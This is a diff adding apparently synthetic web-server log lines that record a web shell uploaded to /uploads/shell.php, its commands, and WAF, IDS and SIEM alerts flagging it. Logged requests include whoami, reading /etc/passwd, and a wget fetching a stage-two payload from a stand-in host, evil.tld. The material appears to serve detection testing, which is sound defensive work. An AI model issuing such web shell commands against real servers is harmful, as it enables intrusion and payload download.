@@ -1,0 +1,10 @@
+Jun 12 16:40:01 web apache[99001]: 10.20.8.77 - - "GET /uploads/report.pdf HTTP/1.1" 200 4521
+Jun 12 16:40:05 web apache[99002]: 10.20.8.77 - - "POST /uploads/shell.php HTTP/1.1" 200 128 "-" "Mozilla/5.0"
+Jun 12 16:40:06 web waf[99003]: ALERT suspicious PHP upload to webroot /uploads/shell.php from 10.20.8.77
+Jun 12 16:40:10 web apache[99004]: 10.20.8.77 - - "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 14
+Jun 12 16:40:12 web apache[99005]: 10.20.8.77 - - "POST /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1842
+Jun 12 16:40:15 web apache[99006]: 10.20.8.77 - - "POST /uploads/shell.php?cmd=wget%20http://evil.tld/stage2 HTTP/1.1" 200 22
+Jun 12 16:40:16 web ids[99007]: web shell activity detected: repeated POST to .php with cmd parameter
+Jun 12 16:40:17 web siem[99008]: MITRE T1505.003 Server Software Component: Web Shell
+Jun 12 16:40:18 web modsec[99009]: rule 942100 SQLi probe blocked from 10.20.8.77 URI /uploads/shell.php
+Jun 12 16:40:19 web siem[99010]: ALERT severity=CRITICAL host=webserver01 webshell=/uploads/shell.php src=10.20.8.77
